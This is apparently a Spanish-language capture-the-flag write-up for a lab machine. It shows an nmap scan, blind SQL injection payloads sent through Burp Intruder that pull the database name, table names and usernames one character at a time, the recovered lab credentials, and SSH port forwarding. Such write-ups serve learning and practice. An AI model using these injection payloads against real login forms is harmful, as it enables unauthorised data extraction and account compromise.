### nmap
```python
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-04 20:02 EST
Nmap scan report for 10.10.64.85
Host is up (0.18s latency).
Not shown: 64902 closed tcp ports (reset), 631 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b0:c5:69:e6:dd:6b:81:0c:da:32:be:41:e3:5b:97:87 (RSA)
|   256 6c:65:ad:87:08:7a:3e:4c:7d:ea:3a:30:76:4d:04:16 (ECDSA)
|_  256 2d:57:1d:56:f6:56:52:29:ea:aa:da:33:b2:77:2c:9c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.21 seconds
```

### Ports: 22/ssh - 80/http

### Enumeración del puerto 80
vamos a intentar hacer una inyección sqli
![[Pasted image 20240204210908.png]]

![[Pasted image 20240204211038.png]]
parece que la pagina esta en mantenimiento. 

vamos a probar otras inyecciones diferentes
![[Pasted image 20240204213231.png]]

![[Pasted image 20240204213305.png]]

### Fuzzing con gobuster

![[Pasted image 20240204213332.png]]
parece que no tenemos ningún directorio que sea de ayuda. 

### sqli usando Burpsuite

```python
	'+and+substring(database(),1,1)="a"+#
```

vamos a interceptar una peticion con burpsuite
![[Pasted image 20240204220002.png]]

intruder
![[Pasted image 20240204220113.png]]

configuramos el payloads
![[Pasted image 20240204220220.png]]
obtenemos como respuesta 

```python
	username=kitty'+and+substring(database(),1,1)="m"+#&password=kitty
```

para la segunda posición obtenemos la letra "y"
![[Pasted image 20240204222627.png]]

para el tercer posición obtenemos la letra "w"
![[Pasted image 20240204223225.png]]
tenemos que hacer esto cambiando la posición hasta conseguir información sobre el nombre de la base de datos

usaremos este parametro para obtener informacion sobre las tablas

```python
	username=kitty'+and+substring((select+table_name+from+information_schema.tables+where+table_schema="mywebsite"+limit+0,1),1,1)="a"+#&password=kitty
```

el primer resultado nos da la letra "s"
![[Pasted image 20240204235500.png]]

ejecutamos el ataque cambiando la posición, en este caso nos da la letra "i"
![[Pasted image 20240205000151.png]]
tenemos que hacer esto hasta sacar el nombre de la tabla

```python
	username=kitty'+AND+SUBSTRING((SELECT+username+from+siteusers+LIMIT+0,1),1,1)="a"+#&password=kitty
```

sacamos carácter de la posición 4 "g"  
![[Pasted image 20240205001529.png]]
hacemos esto desde la posición 1 hasta conseguir todos los caracteres

```python
	username: kitty
	password: L0ng_Liv3_kittY
```

### ssh

![[Pasted image 20240205003102.png]]

### Escalada de Privilegios

![[Pasted image 20240205004914.png]]

conexion por ssh haciendo un port forwarding  
![[Pasted image 20240205005339.png]]

### localhost:8080

![[Pasted image 20240205005619.png]]
tenemos conexión por el puerto 8080 en el que vemos la web de parte del desarrollador

### burpsuite

![[Pasted image 20240205011158.png]]